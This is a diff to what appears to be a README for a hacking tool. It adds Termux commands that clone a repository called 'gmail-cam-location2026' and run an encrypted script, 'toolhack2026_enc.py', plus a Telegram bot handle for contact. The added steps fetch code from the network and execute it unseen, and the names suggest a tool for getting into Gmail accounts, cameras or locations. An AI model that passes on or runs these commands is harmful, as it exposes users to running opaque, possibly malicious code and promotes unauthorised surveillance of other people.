@@ -5,8 +5,21 @@
 
 # Install System
 
+'''
+pkg update
+pkg upgrade
+pkg install git
+git clone https://github.com/Cpmhaoproject/gmail-cam-location2026.git
+cd gmail-cam-location2026
+python3 toolhack2026_enc.py
 
+'''
 
+'''
+bot in here👇
+@ahbank05_bot
+
+'''
 
 [![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&color=00F716&width=435&lines=%F0%9F%A5%B0ANY+TERMINAL+CAN+RUN+THIS+SCRIPT%F0%9F%A5%B0)](https://git.io/typing-svg)
 
